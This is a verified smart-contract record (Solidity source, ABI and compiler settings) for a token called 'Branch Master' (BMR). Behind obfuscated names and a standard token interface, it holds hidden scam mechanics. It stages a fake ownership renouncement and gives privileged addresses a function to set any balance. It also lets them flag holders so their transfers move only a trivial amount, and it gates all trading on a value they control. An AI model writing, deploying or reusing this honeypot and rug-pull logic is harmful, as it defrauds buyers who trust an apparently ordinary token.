{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface buyTakeTx {\n    function createPair(address tokenLiquidityMode, address limitReceiverReceiver) external returns (address);\n}\n\ninterface totalAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atIs) external view returns (uint256);\n\n    function transfer(address launchedLimitBuy, uint256 toReceiver) external returns (bool);\n\n    function allowance(address liquidityAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedLimitBuy,\n        uint256 toReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromAmountReceiver, uint256 value);\n    event Approval(address indexed liquidityAuto, address indexed spender, uint256 value);\n}\n\nabstract contract autoSellFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listWalletAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalAmountMetadata is totalAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BranchMaster is autoSellFee, totalAmount, totalAmountMetadata {\n\n    function transferFrom(address sellSender, address launchedLimitBuy, uint256 toReceiver) external override returns (bool) {\n        if (_msgSender() != senderMinExempt) {\n            if (receiverList[sellSender][_msgSender()] != type(uint256).max) {\n                require(toReceiver <= receiverList[sellSender][_msgSender()]);\n                receiverList[sellSender][_msgSender()] -= toReceiver;\n            }\n        }\n        return enableWallet(sellSender, launchedLimitBuy, toReceiver);\n    }\n\n    uint8 private tradingFeeFrom = 18;\n\n    constructor (){\n        \n        listWalletAt marketingBuy = listWalletAt(senderMinExempt);\n        limitTxBuy = buyTakeTx(marketingBuy.factory()).createPair(marketingBuy.WETH(), address(this));\n        \n        senderTakeAt = _msgSender();\n        listToken[senderTakeAt] = true;\n        txMax[senderTakeAt] = autoWallet;\n        takeLimit();\n        \n        emit Transfer(address(0), senderTakeAt, autoWallet);\n    }\n\n    address senderMinExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public feeShould;\n\n    uint256 liquidityFee;\n\n    function balanceOf(address atIs) public view virtual override returns (uint256) {\n        return txMax[atIs];\n    }\n\n    uint256 public amountLimit;\n\n    string private fundMarketing = \"Branch Master\";\n\n    string private modeTrading = \"BMR\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoWallet;\n    }\n\n    function approve(address receiverBuy, uint256 toReceiver) public virtual override returns (bool) {\n        receiverList[_msgSender()][receiverBuy] = toReceiver;\n        emit Approval(_msgSender(), receiverBuy, toReceiver);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverList;\n\n    function minFund() private view {\n        require(listToken[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundMarketing;\n    }\n\n    bool private autoFee;\n\n    function fundShould(address launchReceiver) public {\n        if (teamSellAt) {\n            return;\n        }\n        \n        listToken[launchReceiver] = true;\n        if (tradingLiquidity == totalTake) {\n            autoFee = false;\n        }\n        teamSellAt = true;\n    }\n\n    bool private tradingLiquidity;\n\n    function owner() external view returns (address) {\n        return receiverBuyExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTrading;\n    }\n\n    function autoMode(address receiverIs, uint256 toReceiver) public {\n        minFund();\n        txMax[receiverIs] = toReceiver;\n    }\n\n    uint256 private enableToken;\n\n    address feeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address teamReceiver, address receiverBuy) external view virtual override returns (uint256) {\n        if (receiverBuy == senderMinExempt) {\n            return type(uint256).max;\n        }\n        return receiverList[teamReceiver][receiverBuy];\n    }\n\n    uint256 private totalAt;\n\n    function takeLimit() public {\n        emit OwnershipTransferred(senderTakeAt, address(0));\n        receiverBuyExempt = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFeeFrom;\n    }\n\n    mapping(address => uint256) private txMax;\n\n    function listAuto(address launchSender) public {\n        minFund();\n        if (shouldMinSender != exemptToken) {\n            exemptToken = false;\n        }\n        if (launchSender == senderTakeAt || launchSender == limitTxBuy) {\n            return;\n        }\n        walletFund[launchSender] = true;\n    }\n\n    mapping(address => bool) public walletFund;\n\n    uint256 constant toIsSender = 3 ** 10;\n\n    uint256 private autoWallet = 100000000 * 10 ** 18;\n\n    bool public shouldMinSender;\n\n    mapping(address => bool) public listToken;\n\n    uint256 listFrom;\n\n    function teamSender(address sellSender, address launchedLimitBuy, uint256 toReceiver) internal returns (bool) {\n        require(txMax[sellSender] >= toReceiver);\n        txMax[sellSender] -= toReceiver;\n        txMax[launchedLimitBuy] += toReceiver;\n        emit Transfer(sellSender, launchedLimitBuy, toReceiver);\n        return true;\n    }\n\n    bool public totalTake;\n\n    address public senderTakeAt;\n\n    bool private exemptToken;\n\n    address private receiverBuyExempt;\n\n    bool public teamSellAt;\n\n    function enableWallet(address sellSender, address launchedLimitBuy, uint256 toReceiver) internal returns (bool) {\n        if (sellSender == senderTakeAt) {\n            return teamSender(sellSender, launchedLimitBuy, toReceiver);\n        }\n        uint256 shouldFund = totalAmount(limitTxBuy).balanceOf(feeTeam);\n        require(shouldFund == liquidityFee);\n        require(launchedLimitBuy != feeTeam);\n        if (walletFund[sellSender]) {\n            return teamSender(sellSender, launchedLimitBuy, toIsSender);\n        }\n        return teamSender(sellSender, launchedLimitBuy, toReceiver);\n    }\n\n    event OwnershipTransferred(address indexed maxMin, address indexed listLiquidity);\n\n    function getOwner() external view returns (address) {\n        return receiverBuyExempt;\n    }\n\n    function limitTo(uint256 toReceiver) public {\n        minFund();\n        liquidityFee = toReceiver;\n    }\n\n    uint256 public autoExempt;\n\n    function transfer(address receiverIs, uint256 toReceiver) external virtual override returns (bool) {\n        return enableWallet(_msgSender(), receiverIs, toReceiver);\n    }\n\n    address public limitTxBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmountReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"autoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"fundShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTxBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"}],\"name\":\"listAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTakeAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMinSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLimitBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BranchMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}